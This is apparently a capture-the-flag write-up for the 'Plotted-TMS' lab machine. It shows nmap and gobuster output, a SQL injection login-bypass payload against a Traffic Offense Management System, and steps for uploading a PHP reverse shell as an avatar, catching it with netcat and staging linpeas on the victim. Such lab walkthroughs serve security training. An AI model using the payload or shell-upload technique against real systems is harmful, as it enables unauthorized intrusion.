# Plotted-TMS


1. Enumerate with nmap
```
root@ip-10-10-75-207:~/Downloads# sudo nmap -sS -A 10.10.73.195

Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-25 18:33 BST
Nmap scan report for ip-10-10-73-195.eu-west-1.compute.internal (10.10.73.195)
Host is up (0.017s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:EC:A9:D7:8D:8F (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=4/25%OT=22%CT=1%CU=31993%PV=Y%DS=1%DC=D%G=Y%M=02ECA9%T
OS:M=6266DBE2%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)
OS:SEQ(SP=FE%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M2301
OS:ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)WI
OS:N(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F5
OS:07%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T
OS:3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%
OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT      ADDRESS
1   17.49 ms ip-10-10-73-195.eu-west-1.compute.internal (10.10.73.195)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.52 seconds
```

2. Brute force directories on port 80 with gobuster. We find `/admin`, `/passwd`, and `/shadow`, but all of them contain base64 encoded text that says that it's `not that easy`
```
root@ip-10-10-75-207:~/Downloads# gobuster dir -u http://10.10.73.195/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.73.195/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/04/25 18:36:25 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/admin (Status: 301)
/index.html (Status: 200)
/passwd (Status: 200)
/server-status (Status: 403)
/shadow (Status: 200)
===============================================================
2022/04/25 18:36:36 Finished
===============================================================
```

3. Brute force directories on port 445 with gobuster. `/management` contains a login page
```
root@ip-10-10-75-207:~/Downloads# gobuster dir -u http://10.10.73.195:445/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.73.195:445/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/04/25 18:36:46 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/management (Status: 301)
/server-status (Status: 403)
===============================================================
2022/04/25 18:36:57 Finished
===============================================================
```

4. Search for the `Traffic Offense Management System` and find [this](https://www.exploit-db.com/exploits/50221) exploit. Use the SQL injection in the exploit `{"username": "'' OR 1=1-- '", "password": "'' OR 1=1-- '"}` to login. Then navigate to the user account portal. Download the [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), change the ip address and port, and then upload the reverse shell as your avatar. Use netcat to catch the connection

5. Download linpeas onto your attacking machine, host it with an http server `python3 -m http.server`, download it onto the victim machine, and run it
